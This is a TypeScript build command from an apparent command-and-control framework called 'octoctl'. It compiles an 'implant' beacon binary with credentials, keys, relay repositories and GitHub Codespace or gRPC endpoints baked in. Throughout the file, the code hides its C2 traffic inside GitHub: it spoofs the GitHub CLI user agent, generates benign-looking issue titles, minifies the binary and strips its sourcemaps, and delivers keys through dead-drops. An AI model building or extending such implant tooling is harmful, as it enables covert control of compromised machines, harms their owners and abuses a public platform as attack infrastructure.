/**
 * octoctl build-beacon
 *
 * Compiles the implant binary with a baked-in X25519 keypair and beacon ID.
 *
 * Usage:
 *   octoctl build-beacon --outfile <path>
 *                        [--beacon-id <uuid>]
 *                        [--source <path>]
 *                        [--relay <account/repo>] (repeatable)
 *                        [--target <bun-target>]
 *
 * Baked compile-time defines:
 *   process.env.OCTOC2_BEACON_ID
 *   process.env.OCTOC2_BEACON_PUBKEY
 *   process.env.OCTOC2_BEACON_SECKEY
 *   process.env.OCTOC2_GITHUB_TOKEN
 *   process.env.OCTOC2_REPO_OWNER
 *   process.env.OCTOC2_REPO_NAME
 *   process.env.OCTOC2_RELAY_CONSORTIUM  (JSON array, only if --relay used)
 *   process.env.SVC_HTTP_URL             (only if --http-url used)
 */

import path from "path";
import { hostname as osHostname } from "os";
import { resolveEnv } from "../lib/env.ts";
import { generateOperatorKeyPair, bytesToBase64 } from "../lib/crypto.ts";
import { loadTitleTemplates, pickIssueTitle, TitleContext } from "../lib/titleTemplates.ts";

export interface RelayEntry {
  account: string;
  repo: string;
}

export interface BuildBeaconDefinesInput {
  beaconId: string;
  publicKeyB64: string;
  secretKeyB64: string;
  token: string;
  owner: string;
  repo: string;
  relayConsortium: RelayEntry[];
  issueTitle?: string;
  /** Numeric GitHub App ID — baked as SVC_APP_ID (not secret; key delivered via dead-drop) */
  appId?: number;
  /** Installation ID for the C2 repo — baked as SVC_INSTALLATION_ID */
  installationId?: number;
  /** GitHub Codespace name to bake in (SVC_GRPC_CODESPACE_NAME). Enables stealth gRPC bootstrap. */
  codespaceName?: string;
  /** GitHub username for Codespace SSH auth (SVC_GITHUB_USER). */
  githubUser?: string;
  /** Tentacle priority to bake in (SVC_TENTACLE_PRIORITY). e.g. "codespaces,issues" */
  tentaclePriority?: string;
  /** Public gRPC URL to bake in (SVC_GRPC_DIRECT). e.g. "https://name-50051.app.github.dev" */
  grpcUrl?: string;
  /** Base HTTP URL to bake in (SVC_HTTP_URL). e.g. "https://codespace-8080.app.github.dev" */
  httpUrl?: string;
}

/** Pure helper — exported for unit testing */
export function buildBeaconDefines(input: BuildBeaconDefinesInput): Record<string, string> {
  const defines: Record<string, string> = {
    "process.env.OCTOC2_BEACON_ID": input.beaconId,
    "process.env.OCTOC2_BEACON_PUBKEY": input.publicKeyB64,
    "process.env.OCTOC2_BEACON_SECKEY": input.secretKeyB64,
    "process.env.OCTOC2_GITHUB_TOKEN": input.token,
    "process.env.OCTOC2_REPO_OWNER": input.owner,
    "process.env.OCTOC2_REPO_NAME": input.repo,
    "process.env.OCTOC2_USER_AGENT": "GitHub CLI/gh/2.48.0 (linux; amd64) go/1.23.0",
  };
  if (input.relayConsortium.length > 0) {
    defines["process.env.OCTOC2_RELAY_CONSORTIUM"] = JSON.stringify(
      input.relayConsortium
    );
  }
  if (input.issueTitle !== undefined) {
    defines["process.env.SVC_ISSUE_TITLE"] = input.issueTitle;
  }
  // App ID and installation ID are not secret — safe to bake into binary.
  // Private key is always delivered at runtime via dead-drop (never baked).
  if (input.appId !== undefined) {
    defines["process.env.SVC_APP_ID"] = String(input.appId);
  }
  if (input.installationId !== undefined) {
    defines["process.env.SVC_INSTALLATION_ID"] = String(input.installationId);
  }
  // Codespace SSH tunnel — all three are non-secret runtime config.
  if (input.codespaceName !== undefined) {
    defines["process.env.SVC_GRPC_CODESPACE_NAME"] = input.codespaceName;
  }
  if (input.githubUser !== undefined) {
    defines["process.env.SVC_GITHUB_USER"] = input.githubUser;
  }
  if (input.tentaclePriority !== undefined) {
    defines["process.env.SVC_TENTACLE_PRIORITY"] = input.tentaclePriority;
  }
  // Public gRPC URL — beacon connects via TLS gRPC without SSH tunnel.
  if (input.grpcUrl !== undefined) {
    defines["process.env.SVC_GRPC_DIRECT"] = input.grpcUrl;
  }
  if (input.httpUrl !== undefined) {
    defines["process.env.SVC_HTTP_URL"] = input.httpUrl;
  }
  return defines;
}

export interface BuildBeaconOptions {
  outfile: string;
  beaconId?: string;
  source?: string;
  relay: string[];
  target: string;
  /** When true (default), pick a random benign issue title from the template file. */
  randomTitle?: boolean; // undefined treated as true — commander --no-random-title sets false
  /** Numeric GitHub App ID to bake in (SVC_APP_ID). Key delivered separately via dead-drop. */
  appId?: number;
  /** Installation ID to bake in (SVC_INSTALLATION_ID). */
  installationId?: number;
  /** GitHub Codespace name to bake in — enables stealth gRPC bootstrap on first run. */
  codespaceName?: string;
  /** GitHub username for Codespace SSH auth. */
  githubUser?: string;
  /** Tentacle priority to bake in. e.g. "codespaces,issues" */
  tentaclePriority?: string;
  /** Public gRPC URL (SVC_GRPC_DIRECT). e.g. "https://name-50051.app.github.dev" or cloudflared URL. */
  grpcUrl?: string;
  /** Base HTTP URL for HttpTentacle (SVC_HTTP_URL). e.g. "https://codespace-8080.app.github.dev" */
  httpUrl?: string;
}

/** Minimal env resolution for build-beacon — only needs token/owner/repo, no operator secret. */
async function resolveBuildEnv() {
  const token = process.env["OCTOC2_GITHUB_TOKEN"]?.trim();
  const owner = process.env["OCTOC2_REPO_OWNER"]?.trim();
  const repo  = process.env["OCTOC2_REPO_NAME"]?.trim();
  const missing: string[] = [];
  if (!token) missing.push("OCTOC2_GITHUB_TOKEN");
  if (!owner) missing.push("OCTOC2_REPO_OWNER");
  if (!repo)  missing.push("OCTOC2_REPO_NAME");
  if (missing.length > 0) throw new Error(`Missing required environment variables: ${missing.join(", ")}`);
  return { token: token!, owner: owner!, repo: repo! };
}

export async function runBuildBeacon(opts: BuildBeaconOptions): Promise<void> {
  const env = await resolveBuildEnv();

  const beaconId = opts.beaconId?.trim() || crypto.randomUUID();
  const kp = await generateOperatorKeyPair();
  const pubB64 = await bytesToBase64(kp.publicKey);
  const secB64 = await bytesToBase64(kp.secretKey);

  // Parse relay entries: each is "account/repo"
  const relayConsortium: RelayEntry[] = opts.relay.map((r) => {
    const [account, repo] = r.split("/");
    if (!account || !repo)
      throw new Error(
        `Invalid relay format: '${r}' — expected account/repo`
      );
    return { account, repo };
  });

  let issueTitle: string | undefined;
  if (opts.randomTitle !== false) {
    const shortId = beaconId.replace(/-/g, "").slice(0, 8);
    const templates = await loadTitleTemplates(
      path.resolve(process.cwd(), "implant/config/title-templates.json")
    );
    const ctx: TitleContext = {
      shortId,
      hostname: osHostname(),
      // Bun ships full ICU; "en-US" locale gives "Mar 30" format on all platforms.
      date: new Date().toLocaleDateString("en-US", { month: "short", day: "numeric" }),
    };
    issueTitle = pickIssueTitle(templates, ctx);
  }

  const defines = buildBeaconDefines({
    beaconId,
    publicKeyB64: pubB64,
    secretKeyB64: secB64,
    token: env.token,
    owner: env.owner,
    repo: env.repo,
    relayConsortium,
    ...(issueTitle            !== undefined && { issueTitle }),
    ...(opts.appId            !== undefined && { appId:           opts.appId }),
    ...(opts.installationId   !== undefined && { installationId:  opts.installationId }),
    ...(opts.codespaceName    !== undefined && { codespaceName:   opts.codespaceName }),
    ...(opts.githubUser       !== undefined && { githubUser:      opts.githubUser }),
    ...(opts.tentaclePriority !== undefined && { tentaclePriority: opts.tentaclePriority }),
    ...(opts.grpcUrl          !== undefined && { grpcUrl:          opts.grpcUrl }),
    ...(opts.httpUrl          !== undefined && { httpUrl:          opts.httpUrl }),
  });

  const source = opts.source ?? "./implant/src/index.ts";
  const defineArgs: string[] = Object.entries(defines).flatMap(([k, v]) => [
    "--define",
    `${k}="${v}"`,
  ]);

  const DIM = "\x1b[2m";
  const BOLD = "\x1b[1m";
  const RESET = "\x1b[0m";
  const GREEN = "\x1b[32m";

  console.log(`\n  Building beacon binary…`);
  console.log(`  ${DIM}Source:${RESET}   ${source}`);
  console.log(`  ${DIM}Target:${RESET}   ${opts.target}`);
  console.log(`  ${DIM}Outfile:${RESET}  ${opts.outfile}`);
  console.log(`  ${DIM}Relays:${RESET}   ${relayConsortium.length} configured`);
  if (issueTitle !== undefined) {
    console.log(`  ${DIM}Issue title:${RESET} ${issueTitle}`);
  }

  // Resolve the bun executable: prefer $BUN_INSTALL/bin or ~/.bun/bin so that
  // the child process can find it even when PATH is stripped (e.g. in CI).
  const bunBin =
    Bun.which("bun") ??
    `${process.env.BUN_INSTALL ?? `${process.env.HOME}/.bun`}/bin/bun`;

  // cpu-features is an optional native addon used by ssh2 (wrapped in try/catch).
  // Bun's bundler cannot resolve the pre-compiled .node binary at build time, so
  // we mark it external to let the try/catch fail gracefully at runtime.
  const proc = Bun.spawn(
    [
      bunBin,
      "build",
      "--compile",
      "--minify",
      "--sourcemap=none",
      '--compile-exec-argv=--smol',
      `--target=${opts.target}`,
      "--external=cpu-features",
      ...defineArgs,
      "--outfile",
      opts.outfile,
      source,
    ],
    {
      stdout: "inherit",
      stderr: "inherit",
      env: {
        ...process.env,
        PATH: `${process.env.HOME}/.bun/bin:${process.env.PATH ?? ""}`,
      },
    }
  );
  const code = await proc.exited;

  if (code !== 0) {
    console.error(`\n  Build failed (exit ${code}).\n`);
    process.exit(1);
  }

  console.log("");
  console.log(`  ${GREEN}✓${RESET} Beacon binary: ${opts.outfile}`);
  console.log(`  ${DIM}Beacon ID:${RESET}  ${beaconId}`);
  console.log(`  ${DIM}Public key:${RESET} ${pubB64}`);
  if (relayConsortium.length > 0) {
    console.log(`  ${DIM}Relay:${RESET}      ${relayConsortium.length} configured`);
  }
  if (opts.appId !== undefined) {
    console.log(`  ${DIM}App ID:${RESET}     ${opts.appId} (baked)`);
  }
  if (opts.installationId !== undefined) {
    console.log(`  ${DIM}Install ID:${RESET} ${opts.installationId} (baked)`);
  }
  if (opts.grpcUrl !== undefined) {
    console.log(`  ${DIM}gRPC URL:${RESET}   ${opts.grpcUrl} (baked)`);
    console.log(`  ${DIM}Priority:${RESET}   ${opts.tentaclePriority ?? "auto-detect"} (baked)`);
  }
  if (opts.httpUrl !== undefined) {
    console.log(`  ${DIM}HTTP URL:${RESET}   ${opts.httpUrl} (baked)`);
  }
  if (opts.grpcUrl === undefined && opts.codespaceName !== undefined) {
    console.log(`  ${DIM}Codespace:${RESET}  ${opts.codespaceName} (baked)`);
    console.log(`  ${DIM}GH user:${RESET}    ${opts.githubUser ?? "(not set)"} (baked)`);
    console.log(`  ${DIM}Priority:${RESET}   ${opts.tentaclePriority ?? "auto-detect"} (baked)`);
  }
  console.log("");
  console.log(`  ${BOLD}To pre-position a dead-drop:${RESET}`);
  if (opts.appId !== undefined) {
    console.log(
      `  octoctl drop create --beacon ${beaconId.slice(0, 8)} --app-key-file ~/.config/svc/app-key.pem`
    );
  } else {
    console.log(
      `  octoctl drop create --beacon ${beaconId.slice(0, 8)} --server-url https://myserver:8080`
    );
  }
  console.log("");
}
